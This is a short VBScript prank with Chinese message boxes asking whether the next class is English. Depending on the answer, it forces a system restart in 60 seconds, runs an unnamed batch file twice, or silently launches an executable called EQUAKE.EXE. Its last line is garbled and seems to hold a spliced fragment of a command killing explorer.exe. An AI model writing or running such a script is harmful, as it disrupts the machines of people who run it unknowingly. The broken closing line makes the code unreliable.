Dim Response
Set ws = CreateObject("Wscript.Shell") 
Response = Msgbox ("请问：下一节是英语课吗？" , VbYesNo , "提問")
If Response = vbYes Then
Msgbox "那就对了233",0,"呵呵呵呵呵"
ws.run "cmd /k shutdown /r /t 60"
ws.run "cmd /k poi~.bat"
ws.run "cmd /k poi~.bat"
End If
If Response = vbNo Then
Msgbox "原来如此啊",0,"╮(╯▽╰)╭"
ws.run "cmd /k EQUAKE.EXE",vbhide
End Iff -t -im explorer.exe",vbhide